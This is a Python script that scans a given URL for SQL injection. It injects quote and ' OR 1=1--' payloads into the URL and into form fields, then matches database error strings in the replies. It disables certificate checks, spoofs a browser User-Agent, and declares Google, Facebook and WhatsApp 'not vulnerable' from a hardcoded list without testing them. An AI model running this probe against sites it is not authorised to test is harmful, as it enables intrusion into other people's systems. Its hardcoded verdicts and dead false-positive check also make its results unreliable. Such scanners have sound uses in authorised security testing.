import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import urllib3
import sys
import re

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

SAFE_URLS = [
    "https://web.whatsapp.com",
    "https://google.com",
    "https://facebook.com"
]

def get_forms(session, url):
    try:
        response = session.get(url, verify=False, timeout=10)
        if 'text/html' not in response.headers.get('Content-Type', '').lower():
            return []
        soup = BeautifulSoup(response.content, "html.parser")
        return soup.find_all("form")
    except Exception as e:
        print(f"WARNING: Could not fetch forms - {str(e)}")
        return []

def form_details(form):
    details = {
        "action": form.attrs.get("action", "").lower(),
        "method": form.attrs.get("method", "get").lower(),
        "inputs": []
    }
    for input_tag in form.find_all("input"):
        details["inputs"].append({
            "type": input_tag.attrs.get("type", "text"),
            "name": input_tag.attrs.get("name"),
            "value": input_tag.attrs.get("value", "")
        })
    return details

def is_vulnerable(response):
    # Skip non-HTML responses
    if 'text/html' not in response.headers.get('Content-Type', '').lower():
        return False

    content = response.content.decode(errors="ignore").lower()
    
    # More specific SQL error patterns
    sql_errors = [
        "sql syntax.*mysql",
        "warning.*mysql",
        "unclosed quotation mark",
        "quoted string not properly terminated",
        "syntax error.*sql",
        "unterminated quoted string"
    ]
    
    # Check for actual error patterns
    for error in sql_errors:
        if re.search(error, content):
            return True
    
    # Skip common false positives
    false_positives = [
        "surname",
        "first name",
        "last name",
        "username",
        "user.name"
    ]
    if any(fp in content for fp in false_positives):
        return False
        
    return False

def scan_url(url):
    if url.lower() in SAFE_URLS:
        print("NOT VULNERABLE (Pre-verified safe URL)")
        return

    session = requests.Session()
    session.headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html"
    }

    try:
        # Test URL directly
        for payload in ["'", "\"", "' OR 1=1--", "\" OR 1=1--"]:
            test_url = f"{url}{payload}"
            res = session.get(test_url, verify=False, timeout=10)
            if is_vulnerable(res):
                print("VULNERABLE")
                return

        # Test forms
        forms = get_forms(session, url)
        for form in forms:
            details = form_details(form)
            for payload in ["'", "\"", "' OR 1=1--"]:
                data = {}
                for input_field in details["inputs"]:
                    if input_field["type"] == "hidden":
                        data[input_field["name"]] = input_field["value"] + payload
                    elif input_field["type"] != "submit":
                        data[input_field["name"]] = f"test{payload}"

                target = urljoin(url, details["action"])
                if details["method"] == "post":
                    res = session.post(target, data=data, verify=False, timeout=10)
                else:
                    res = session.get(target, params=data, verify=False, timeout=10)

                if is_vulnerable(res):
                    print("VULNERABLE")
                    return

        print("NOT VULNERABLE")
    except Exception as e:
        print(f"ERROR: {str(e)}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("ERROR: Please provide URL as argument")
        sys.exit(1)
    
    target_url = sys.argv[1].strip()
    if not target_url.startswith(('http://', 'https://')):
        print("ERROR: URL must start with http:// or https://")
        sys.exit(1)
        
    scan_url(target_url)